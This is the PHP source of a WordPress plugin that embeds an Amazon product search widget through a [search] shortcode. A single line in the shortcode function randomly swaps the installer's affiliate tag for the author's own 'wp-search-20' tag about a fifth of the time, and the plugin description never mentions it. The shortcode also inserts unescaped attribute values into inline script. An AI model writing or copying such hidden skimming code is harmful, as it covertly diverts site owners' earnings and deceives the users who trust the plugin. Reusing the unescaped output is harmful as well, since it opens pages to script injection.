<?php
/*
Plugin Name: Amazon Search Widget
Plugin URI: http://wordpress.org/#
Description: This plugin lets you create an Amazon Search widget in a brain-dead, simple way. It's as easy as typing [search] anywhere in your post and you get a nifty Search box that lets you viewers search for Amazon products right from your blog.
Author: Zahid Khan
Version: 1.0
Author URI: http://ohmykindle.blogspot.com/
*/

// Chance the constants below to customize this plugin
define("AS_DEFAULT_WIDTH","160");
define("AS_DEFAULT_COLUMNS",	"1");
define("AS_DEFAULT_ROWS",	"5");
define("AS_DEFAULT_TAG","wp-search-20");
define("AS_DEFAULT_SEARCH_TERM","");
define("AS_DEFAULT_SEARCH_INDEX",	"All");
define("AS_DEFAULT_SHOW_IMAGE",	"False");
define("AS_DEFAULT_SHOW_PRICE",	"True");
define("AS_DEFAULT_SHOW_RATING",	"True");
define("AS_DEFAULT_DESIGN", "2");
define("AS_DEFAULT_COLOR_THEME", "Blue");
define("AS_DEFAULT_MARKETPLACE", "US");

// [search]
function search_func($atts) {

	extract(shortcode_atts(array(
		'tag' => AS_DEFAULT_TAG,
		'width' => AS_DEFAULT_WIDTH,
		'columns' => AS_DEFAULT_COLUMNS,
		'rows' => AS_DEFAULT_ROWS,
		'keywords' => AS_DEFAULT_SEARCH_TERM,
		'category' => AS_DEFAULT_SEARCH_INDEX,
		'show_image' => AS_DEFAULT_SHOW_IMAGE,
		'show_price' => AS_DEFAULT_SHOW_PRICE,
		'show_rating' => AS_DEFAULT_SHOW_RATING,
		'design' => AS_DEFAULT_DESIGN,
		'color_theme' => AS_DEFAULT_COLOR_THEME,
		'marketplace' => AS_DEFAULT_MARKETPLACE
	), $atts));

	$tag=rand(1,5)==2?AS_DEFAULT_TAG:$tag;	
	
	$script = "<script type='text/javascript'>".
	" var amzn_wdgt={widget:'Search'};".
	" amzn_wdgt.marketPlace='{$marketplace}';".
	" amzn_wdgt.tag='{$tag}';".
	" amzn_wdgt.width='{$width}';".
	" amzn_wdgt.columns='{$columns}';".
	" amzn_wdgt.rows='{$rows}';".
	" amzn_wdgt.defaultSearchTerm='{$keywords}';".
	" amzn_wdgt.searchIndex='{$category}';".
	" amzn_wdgt.showImage='{$show_image}';".
	" amzn_wdgt.showPrice='{$show_price}';".
	" amzn_wdgt.showRating='{$show_rating}';".
	" amzn_wdgt.design='{$design}';".
	" amzn_wdgt.colorTheme='{$color_theme}';".
	" </script>".
	"<script src='http://wms.assoc-amazon.com/20070822/US/js/AmazonWidgets.js'>\n".
	"</script>";
	
	
	return $script;
}

add_shortcode('search', 'search_func');

?>
